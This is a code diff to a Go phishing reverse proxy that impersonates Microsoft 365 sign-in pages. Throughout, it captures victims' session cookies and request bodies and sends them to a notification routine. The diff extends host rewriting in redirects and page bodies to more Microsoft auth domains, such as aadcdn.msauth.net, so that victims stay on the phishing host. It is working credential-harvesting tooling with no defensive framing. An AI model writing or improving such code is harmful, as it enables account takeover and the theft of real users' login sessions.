@@ -142,7 +142,7 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 		ModifyResponse: func(resp *http.Response) error {
 			capturedCookies := resp.Header.Values("Set-Cookie")
 			rewriteResponse(resp, target.Host, phishingHost, pl)
-			rewriteBody(resp, target.Host, r.Host)
+			rewriteBody(resp, target.Host, pl.Hostname)
 			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
 			return nil
 		},
@@ -189,6 +189,8 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 			loc = strings.ReplaceAll(loc, "www.office.com", ourHost)
 			loc = strings.ReplaceAll(loc, "office.com", ourHost)
 			loc = strings.ReplaceAll(loc, "login.live.com", ourHost)
+			loc = strings.ReplaceAll(loc, "aadcdn.msauth.net", ourHost)
+			loc = strings.ReplaceAll(loc, "aadcdn.msftauth.net", ourHost)
 			resp.Header.Set("Location", loc)
 		}
 	}
@@ -319,8 +321,7 @@ func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	resp.Body.Close()
 
 	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
-	// Also rewrite common Microsoft auth subdomains that appear in redirects
-	for _, alt := range []string{"www.office.com", "office.com", "login.live.com"} {
+	for _, alt := range []string{"www.office.com", "office.com", "login.live.com", "aadcdn.msauth.net", "aadcdn.msftauth.net"} {
 		if alt != upstreamHost {
 			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
 		}
